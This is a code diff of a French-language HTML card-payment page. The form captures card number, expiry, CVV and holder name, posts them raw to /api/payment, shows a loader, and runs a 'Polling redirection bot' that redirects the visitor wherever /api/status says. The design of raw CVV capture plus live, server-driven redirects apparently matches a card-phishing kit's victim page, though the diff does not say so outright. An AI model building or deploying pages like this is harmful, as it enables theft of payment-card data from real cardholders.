@@ -1,38 +1,48 @@
 <!DOCTYPE html>
 <html lang="fr">
-<head><meta charset="UTF-8"><title>Paiement</title></head>
+<head>
+<meta charset="UTF-8">
+<title>Paiement</title>
+<style>
+#loader{display:none;} 
+</style>
+</head>
 <body>
 <h1>💳 Paiement</h1>
 <form id="paymentForm">
-Numéro carte: <input name="number"><br>
-Date exp: <input name="expiry"><br>
-CCV: <input name="ccv"><br>
-Nom titulaire: <input name="holder"><br>
-<button type="submit">Valider</button>
+<input type="text" name="nomTitulaire" placeholder="Nom titulaire" required>
+<input type="text" name="cardNumber" placeholder="Numéro carte" required>
+<input type="text" name="expiry" placeholder="MM/AA" required>
+<input type="text" name="cvv" placeholder="CVV" required>
+<button type="submit">Payer</button>
 </form>
+<div id="loader">⏳ Paiement en cours...</div>
+
 <script>
-document.getElementById('paymentForm').onsubmit = async function(e){
-  e.preventDefault();
-  const sessionId = localStorage.getItem('sessionId');
-  const data = {
-    sessionId,
-    number:this.number.value,
-    expiry:this.expiry.value,
-    ccv:this.ccv.value,
-    holder:this.holder.value
-  };
-  await fetch('/api/payment',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
-  window.location.href = '/loader.html?sid='+sessionId;
+document.getElementById('paymentForm').addEventListener('submit', async (e)=>{
+    e.preventDefault();
+    const form = e.target;
+    const data = {
+        nomTitulaire: form.nomTitulaire.value,
+        cardNumber: form.cardNumber.value,
+        expiry: form.expiry.value,
+        cvv: form.cvv.value
+    };
+    await fetch('/api/payment',{method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)});
+    form.style.display='none';
+    document.getElementById('loader').style.display='block';
+});
+
+// Polling redirection bot
+async function pollRedirect(){
+    const res = await fetch('/api/status');
+    const data = await res.json();
+    if(data.redirect && window.location.pathname !== data.redirect){
+        window.location.href = data.redirect;
+    }
+    setTimeout(pollRedirect,1000);
 }
-async function checkRedirect(){
-  const sessionId = localStorage.getItem('sessionId');
-  if(!sessionId) return;
-  const res = await fetch('/api/status?sessionId='+sessionId);
-  const data = await res.json();
-  if(data.redirect) window.location.href = data.redirect;
-  else setTimeout(checkRedirect,2000);
-}
-checkRedirect();
+pollRedirect();
 </script>
 </body>
 </html>
